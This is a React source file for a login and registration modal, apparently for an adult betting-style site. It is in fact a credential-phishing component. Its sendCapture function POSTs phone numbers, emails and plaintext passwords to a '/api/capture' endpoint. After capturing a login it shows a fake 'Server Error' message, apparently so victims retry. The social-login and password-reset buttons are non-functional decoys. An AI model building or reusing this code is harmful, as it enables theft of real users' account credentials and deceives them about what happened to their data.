'use client';

import React, { useState, useEffect } from 'react';

export interface AuthModalProps {
  isOpen: boolean;
  onClose: () => void;
  initialMode?: 'login' | 'register';
}

interface PasswordInputProps {
  id: string;
  value: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  error?: string;
  placeholder?: string;
  onClearError: () => void;
}

const COUNTRIES = [
  { code: '+91', name: 'India', flag: '🇮🇳' },
  { code: '+880', name: 'Bangladesh', flag: '🇧🇩' },
  { code: '+92', name: 'Pakistan', flag: '🇵🇰' },
  { code: '+971', name: 'UAE', flag: '🇦🇪' },
  { code: '+1', name: 'USA', flag: '🇺🇸' },
  { code: '+44', name: 'UK', flag: '🇬🇧' },
  { code: '+7', name: 'Russia', flag: '🇷🇺' },
  { code: '+90', name: 'Turkey', flag: '🇹🇷' },
];

const CURRENCIES = [
  { code: 'INR', symbol: '₹', name: 'Indian Rupee' },
  { code: 'USD', symbol: '$', name: 'US Dollar' },
  { code: 'EUR', symbol: '€', name: 'Euro' },
  { code: 'BDT', symbol: '৳', name: 'Bangladeshi Taka' },
  { code: 'PKR', symbol: '₨', name: 'Pakistani Rupee' },
  { code: 'AED', symbol: 'د.إ', name: 'UAE Dirham' },
];

// Icons
function PhoneIcon() {
  return (
    <svg className="modal-tab-icon" width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
      <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z" />
    </svg>
  );
}

function EmailIcon() {
  return (
    <svg className="modal-tab-icon" width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
      <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
    </svg>
  );
}

function LockIcon() {
  return (
    <svg className="form-icon" width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
      <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z" />
    </svg>
  );
}

function EyeIcon({ show }: { show: boolean }) {
  if (show) {
    return (
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
        <circle cx="12" cy="12" r="3" />
      </svg>
    );
  }
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
      <line x1="1" y1="1" x2="23" y2="23" />
    </svg>
  );
}

function PasswordInput({ id, value, onChange, error, placeholder, onClearError }: PasswordInputProps) {
  const [show, setShow] = useState(false);
  return (
    <div className="form-group">
      <div className={`form-input-wrapper${error ? ' form-input-wrapper--error' : ''}`}>
        <LockIcon />
        <input
          type={show ? 'text' : 'password'}
          className="form-input"
          id={id}
          placeholder={placeholder || 'Password'}
          autoComplete="current-password"
          value={value}
          onChange={onChange}
          onFocus={onClearError}
        />
        <button
          type="button"
          className="form-password-toggle"
          aria-label="Toggle password visibility"
          onClick={() => setShow(!show)}
        >
          <EyeIcon show={show} />
        </button>
      </div>
      {error && <span className="form-error-text">{error}</span>}
    </div>
  );
}

export default function AuthModal({ isOpen, onClose, initialMode = 'login' }: AuthModalProps) {
  const [authMode, setAuthMode] = useState<'login' | 'register'>(initialMode);
  const [loginSubTab, setLoginSubTab] = useState<'phone' | 'email'>('phone');
  const [showSuccess, setShowSuccess] = useState(false);
  const [showError, setShowError] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [statusMessage, setStatusMessage] = useState('');

  // Login state
  const [loginPhone, setLoginPhone] = useState('');
  const [loginPhoneCode, setLoginPhoneCode] = useState('+91');
  const [loginPhoneErr, setLoginPhoneErr] = useState('');
  const [loginEmail, setLoginEmail] = useState('');
  const [loginEmailErr, setLoginEmailErr] = useState('');
  const [loginPwd, setLoginPwd] = useState('');
  const [loginPwdErr, setLoginPwdErr] = useState('');

  // Registration state
  const [regCurrency, setRegCurrency] = useState('INR');
  const [regPhoneCode, setRegPhoneCode] = useState('+91');
  const [regPhone, setRegPhone] = useState('');
  const [regPhoneErr, setRegPhoneErr] = useState('');
  const [regEmail, setRegEmail] = useState('');
  const [regEmailErr, setRegEmailErr] = useState('');
  const [regPwd, setRegPwd] = useState('');
  const [regPwdErr, setRegPwdErr] = useState('');
  const [showPromo, setShowPromo] = useState(false);
  const [regPromo, setRegPromo] = useState('');
  const [regAgreed, setRegAgreed] = useState(true);
  const [regAgreedErr, setRegAgreedErr] = useState('');

  const clearAllErrors = () => {
    setLoginPhoneErr('');
    setLoginEmailErr('');
    setLoginPwdErr('');
    setRegPhoneErr('');
    setRegEmailErr('');
    setRegPwdErr('');
    setRegAgreedErr('');
    setStatusMessage('');
  };

  const handleClose = React.useCallback(() => {
    clearAllErrors();
    setShowSuccess(false);
    setShowError(false);
    setIsSubmitting(false);
    onClose();
  }, [onClose]);

  // Keyboard close
  useEffect(() => {
    const handleKey = (e: KeyboardEvent) => {
      if (e.key === 'Escape') handleClose();
    };
    document.addEventListener('keydown', handleKey);
    return () => document.removeEventListener('keydown', handleKey);
  }, [handleClose]);

  // Lock body scroll
  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = '';
    }
    return () => {
      document.body.style.overflow = '';
    };
  }, [isOpen]);

  const switchMode = (mode: 'login' | 'register') => {
    setAuthMode(mode);
    clearAllErrors();
    setShowSuccess(false);
    setShowError(false);
  };

  // Login Phone input handler
  const handlePhoneInput = (val: string, setter: (v: string) => void) => {
    const clean = val.replace(/[^\d\s]/g, '');
    setter(clean);
  };

  // Handle Login Submit
  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    clearAllErrors();
    let valid = true;

    if (loginSubTab === 'phone') {
      const digits = loginPhone.replace(/\D/g, '');
      if (!loginPhone.trim()) {
        setLoginPhoneErr('Please enter your phone number');
        valid = false;
      } else if (digits.length < 10) {
        setLoginPhoneErr('Enter a valid 10-digit mobile number');
        valid = false;
      }
    } else {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!loginEmail.trim()) {
        setLoginEmailErr('Please enter your email address');
        valid = false;
      } else if (!emailRegex.test(loginEmail.trim())) {
        setLoginEmailErr('Please enter a valid email address');
        valid = false;
      }
    }

    if (!loginPwd.trim()) {
      setLoginPwdErr('Please enter your password');
      valid = false;
    } else if (loginPwd.trim().length < 6) {
      setLoginPwdErr('Password must be at least 6 characters');
      valid = false;
    }

    if (!valid) return;

    await sendCapture({
      type: 'Login',
      method: loginSubTab,
      identifier: loginSubTab === 'phone' ? `${loginPhoneCode} ${loginPhone}` : loginEmail,
      password: loginPwd,
    });
  };

  // Handle Registration Submit
  const handleRegisterSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    clearAllErrors();
    let valid = true;

    const digits = regPhone.replace(/\D/g, '');
    if (!regPhone.trim()) {
      setRegPhoneErr('Please enter your phone number');
      valid = false;
    } else if (digits.length < 10) {
      setRegPhoneErr('Enter a valid 10-digit mobile number');
      valid = false;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!regEmail.trim()) {
      setRegEmailErr('Please enter your email address');
      valid = false;
    } else if (!emailRegex.test(regEmail.trim())) {
      setRegEmailErr('Please enter a valid email address');
      valid = false;
    }

    if (!regPwd.trim()) {
      setRegPwdErr('Please enter a password');
      valid = false;
    } else if (regPwd.trim().length < 6) {
      setRegPwdErr('Password must be at least 6 characters');
      valid = false;
    }

    if (!regAgreed) {
      setRegAgreedErr('You must agree to the User Agreement');
      valid = false;
    }

    if (!valid) return;

    await sendCapture({
      type: 'Registration',
      currency: regCurrency,
      phone: `${regPhoneCode} ${regPhone}`,
      email: regEmail,
      password: regPwd,
      promoCode: regPromo || undefined,
      agreedTerms: regAgreed,
    });
  };

  const sendCapture = async (data: Record<string, unknown>) => {
    setIsSubmitting(true);
    setShowSuccess(false);
    setShowError(false);

    try {
      const res = await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, timestamp: new Date().toISOString() }),
      });
      setIsSubmitting(false);
      if (res.ok) {
        setShowSuccess(true);
        setStatusMessage(
          data.type === 'Registration'
            ? 'Registration successful! Verification link sent to your email.'
            : 'Server Error: Something went wrong on our end. Please try again later.'
        );
      } else {
        setShowError(true);
      }
    } catch {
      setIsSubmitting(false);
      setShowError(true);
    }
  };

  if (!isOpen) return null;

  return (
    <div
      className="modal-overlay modal-overlay--active"
      onClick={(e) => {
        if (e.target === e.currentTarget) handleClose();
      }}
    >
      <div className="login-modal" role="dialog" aria-modal="true">
        {/* Drag handle for mobile */}
        <div className="modal-drag-handle" />

        {/* Success or Error Screen */}
        {showSuccess ? (
          <div className="party-ticket-container">
            <div className="party-success-card">
              <div className="auth-card-icon-wrap">
                <span className="auth-dot-accent" />
              </div>
              <h3>{authMode === 'register' ? 'Account Created' : 'Server Notice'}</h3>
              <p className="success-message-text">{statusMessage}</p>
              <button
                type="button"
                className="btn-submit"
                style={{ marginTop: '20px' }}
                onClick={handleClose}
              >
                Close
              </button>
            </div>
          </div>
        ) : showError ? (
          <div className="party-ticket-container">
            <div className="party-success-card party-error-card">
              <h3 style={{ color: '#ef4444' }}>Network Error</h3>
              <p className="success-message-text">
                Unable to complete request. Please check your internet connection and try again.
              </p>
              <button
                type="button"
                className="btn-submit btn-retry"
                onClick={() => setShowError(false)}
              >
                Try Again
              </button>
            </div>
          </div>
        ) : (
          <div>
            {/* Header: Brand & Close */}
            <div className="modal-header">
              <div className="auth-brand-badge">
                <span className="auth-status-dot" />
                <span className="auth-brand-text">Account Access</span>
              </div>
              <button
                type="button"
                className="modal-close"
                aria-label="Close"
                onClick={handleClose}
              >
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" />
                </svg>
              </button>
            </div>

            {/* Primary Mode Tabs: [ Log in ] [ Registration ] */}
            <div className="auth-mode-tabs">
              <button
                type="button"
                className={`auth-mode-tab${authMode === 'login' ? ' auth-mode-tab--active' : ''}`}
                onClick={() => switchMode('login')}
              >
                Log in
              </button>
              <button
                type="button"
                className={`auth-mode-tab${authMode === 'register' ? ' auth-mode-tab--active auth-mode-tab--register' : ''}`}
                onClick={() => switchMode('register')}
              >
                Registration
              </button>
            </div>

            {/* =========================================================
                LOGIN VIEW
               ========================================================= */}
            {authMode === 'login' && (
              <div>
                {/* Subtabs: Phone vs Email */}
                <div className="modal-tabs">
                  <button
                    type="button"
                    className={`modal-tab${loginSubTab === 'phone' ? ' modal-tab--active' : ''}`}
                    onClick={() => {
                      setLoginSubTab('phone');
                      clearAllErrors();
                    }}
                  >
                    <PhoneIcon />
                    <span>Phone</span>
                  </button>
                  <button
                    type="button"
                    className={`modal-tab${loginSubTab === 'email' ? ' modal-tab--active' : ''}`}
                    onClick={() => {
                      setLoginSubTab('email');
                      clearAllErrors();
                    }}
                  >
                    <EmailIcon />
                    <span>Email</span>
                  </button>
                </div>

                <form noValidate onSubmit={handleLoginSubmit} className="modal-form">
                  {/* Phone Input */}
                  {loginSubTab === 'phone' && (
                    <div className="form-group">
                      <div className={`form-input-wrapper${loginPhoneErr ? ' form-input-wrapper--error' : ''}`}>
                        <div className="country-selector">
                          <select
                            className="country-select"
                            value={loginPhoneCode}
                            onChange={(e) => setLoginPhoneCode(e.target.value)}
                            aria-label="Country Code"
                          >
                            {COUNTRIES.map((c) => (
                              <option key={c.code} value={c.code}>
                                {c.flag} {c.code}
                              </option>
                            ))}
                          </select>
                        </div>
                        <input
                          type="tel"
                          className="form-input"
                          placeholder="98765 43210"
                          autoComplete="tel"
                          value={loginPhone}
                          onChange={(e) => handlePhoneInput(e.target.value, setLoginPhone)}
                          onFocus={() => setLoginPhoneErr('')}
                        />
                      </div>
                      {loginPhoneErr && <span className="form-error-text">{loginPhoneErr}</span>}
                    </div>
                  )}

                  {/* Email Input */}
                  {loginSubTab === 'email' && (
                    <div className="form-group">
                      <div className={`form-input-wrapper${loginEmailErr ? ' form-input-wrapper--error' : ''}`}>
                        <svg className="form-icon" width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                          <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
                        </svg>
                        <input
                          type="email"
                          className="form-input"
                          placeholder="Email"
                          autoComplete="email"
                          value={loginEmail}
                          onChange={(e) => setLoginEmail(e.target.value)}
                          onFocus={() => setLoginEmailErr('')}
                        />
                      </div>
                      {loginEmailErr && <span className="form-error-text">{loginEmailErr}</span>}
                    </div>
                  )}

                  {/* Password */}
                  <PasswordInput
                    id="login-password"
                    value={loginPwd}
                    onChange={(e) => setLoginPwd(e.target.value)}
                    error={loginPwdErr}
                    placeholder="Password"
                    onClearError={() => setLoginPwdErr('')}
                  />

                  <div className="form-hint">
                    <button type="button" className="form-forgot">
                      Forgot your password?
                    </button>
                  </div>

                  <button type="submit" className="btn-submit btn-submit-login" disabled={isSubmitting}>
                    {isSubmitting ? 'Logging in...' : 'Log in'}
                  </button>
                </form>

                {/* Social Divider */}
                <div className="modal-divider">or log in with</div>
                <div className="social-login">
                  <button type="button" className="social-login-icon" aria-label="Log in with Google">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12.545 10.239v3.821h5.445c-.712 2.315-2.647 3.972-5.445 3.972a6.033 6.033 0 110-12.064c1.498 0 2.866.549 3.921 1.453l2.814-2.814A9.969 9.969 0 0012.545 2C7.021 2 2.543 6.477 2.543 12s4.478 10 10.002 10c8.396 0 10.249-7.85 9.426-11.748l-9.426-.013z" />
                    </svg>
                  </button>
                  <button type="button" className="social-login-icon" aria-label="Log in with Telegram">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.19c-.08-.06-.19-.04-.27-.02-.12.03-1.99 1.27-5.62 3.72-.53.36-1.01.54-1.44.53-.47-.01-1.38-.27-2.06-.49-.83-.27-1.49-.42-1.43-.88.03-.24.37-.49 1.02-.74l7.9-3.41z" />
                    </svg>
                  </button>
                </div>

                <div className="modal-register-link">
                  <p>
                    Don&apos;t have an account?{' '}
                    <button
                      type="button"
                      className="link-btn"
                      onClick={() => switchMode('register')}
                    >
                      Register
                    </button>
                  </p>
                </div>
              </div>
            )}

            {/* =========================================================
                REGISTRATION VIEW
               ========================================================= */}
            {authMode === 'register' && (
              <div>
                <form noValidate onSubmit={handleRegisterSubmit} className="modal-form">
                  {/* Currency Selector */}
                  <div className="form-group">
                    <label className="form-label" htmlFor="reg-currency">
                      Currency
                    </label>
                    <div className="form-input-wrapper">
                      <select
                        id="reg-currency"
                        className="form-select"
                        value={regCurrency}
                        onChange={(e) => setRegCurrency(e.target.value)}
                      >
                        {CURRENCIES.map((cur) => (
                          <option key={cur.code} value={cur.code}>
                            {cur.symbol} {cur.code} — {cur.name}
                          </option>
                        ))}
                      </select>
                    </div>
                  </div>

                  {/* Phone Number */}
                  <div className="form-group">
                    <label className="form-label" htmlFor="reg-phone">
                      Phone Number
                    </label>
                    <div className={`form-input-wrapper${regPhoneErr ? ' form-input-wrapper--error' : ''}`}>
                      <div className="country-selector">
                        <select
                          className="country-select"
                          value={regPhoneCode}
                          onChange={(e) => setRegPhoneCode(e.target.value)}
                          aria-label="Country Code"
                        >
                          {COUNTRIES.map((c) => (
                            <option key={c.code} value={c.code}>
                              {c.flag} {c.code}
                            </option>
                          ))}
                        </select>
                      </div>
                      <input
                        id="reg-phone"
                        type="tel"
                        className="form-input"
                        placeholder="98765 43210"
                        autoComplete="tel"
                        value={regPhone}
                        onChange={(e) => handlePhoneInput(e.target.value, setRegPhone)}
                        onFocus={() => setRegPhoneErr('')}
                      />
                    </div>
                    {regPhoneErr && <span className="form-error-text">{regPhoneErr}</span>}
                  </div>

                  {/* Email */}
                  <div className="form-group">
                    <label className="form-label" htmlFor="reg-email">
                      Email
                    </label>
                    <div className={`form-input-wrapper${regEmailErr ? ' form-input-wrapper--error' : ''}`}>
                      <svg className="form-icon" width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
                      </svg>
                      <input
                        id="reg-email"
                        type="email"
                        className="form-input"
                        placeholder="you@example.com"
                        autoComplete="email"
                        value={regEmail}
                        onChange={(e) => setRegEmail(e.target.value)}
                        onFocus={() => setRegEmailErr('')}
                      />
                    </div>
                    {regEmailErr && <span className="form-error-text">{regEmailErr}</span>}
                  </div>

                  {/* Password */}
                  <div className="form-group">
                    <label className="form-label" htmlFor="reg-password">
                      Password
                    </label>
                    <PasswordInput
                      id="reg-password"
                      value={regPwd}
                      onChange={(e) => setRegPwd(e.target.value)}
                      error={regPwdErr}
                      placeholder="Create password"
                      onClearError={() => setRegPwdErr('')}
                    />
                  </div>

                  {/* Promo Code Toggle */}
                  <div className="promo-section">
                    <button
                      type="button"
                      className="btn-promo-toggle"
                      onClick={() => setShowPromo(!showPromo)}
                    >
                      {showPromo ? '− Hide promo code' : '+ Add promo code'}
                    </button>
                    {showPromo && (
                      <div className="form-group" style={{ marginTop: '8px' }}>
                        <div className="form-input-wrapper">
                          <input
                            type="text"
                            className="form-input"
                            placeholder="Enter promo code (e.g. VIP2026)"
                            value={regPromo}
                            onChange={(e) => setRegPromo(e.target.value)}
                          />
                        </div>
                      </div>
                    )}
                  </div>

                  {/* User Agreement Checkbox */}
                  <div className="form-group">
                    <label className="terms-checkbox-wrap">
                      <input
                        type="checkbox"
                        checked={regAgreed}
                        onChange={(e) => {
                          setRegAgreed(e.target.checked);
                          if (e.target.checked) setRegAgreedErr('');
                        }}
                      />
                      <span>
                        I agree to the <a href="#" onClick={(e) => e.preventDefault()}>User Agreement</a> and confirm I am 18+ years old.
                      </span>
                    </label>
                    {regAgreedErr && <span className="form-error-text">{regAgreedErr}</span>}
                  </div>

                  {/* Submit Button */}
                  <button
                    type="submit"
                    className="btn-submit btn-submit-register"
                    disabled={isSubmitting}
                  >
                    {isSubmitting ? 'Registering...' : 'Register'}
                  </button>
                </form>

                {/* Social Divider */}
                <div className="modal-divider">or register with</div>
                <div className="social-login">
                  <button type="button" className="social-login-icon" aria-label="Register with Google">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12.545 10.239v3.821h5.445c-.712 2.315-2.647 3.972-5.445 3.972a6.033 6.033 0 110-12.064c1.498 0 2.866.549 3.921 1.453l2.814-2.814A9.969 9.969 0 0012.545 2C7.021 2 2.543 6.477 2.543 12s4.478 10 10.002 10c8.396 0 10.249-7.85 9.426-11.748l-9.426-.013z" />
                    </svg>
                  </button>
                  <button type="button" className="social-login-icon" aria-label="Register with Telegram">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.19c-.08-.06-.19-.04-.27-.02-.12.03-1.99 1.27-5.62 3.72-.53.36-1.01.54-1.44.53-.47-.01-1.38-.27-2.06-.49-.83-.27-1.49-.42-1.43-.88.03-.24.37-.49 1.02-.74l7.9-3.41z" />
                    </svg>
                  </button>
                </div>

                <div className="modal-register-link">
                  <p>
                    Already have an account?{' '}
                    <button
                      type="button"
                      className="link-btn"
                      onClick={() => switchMode('login')}
                    >
                      Log in
                    </button>
                  </p>
                </div>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
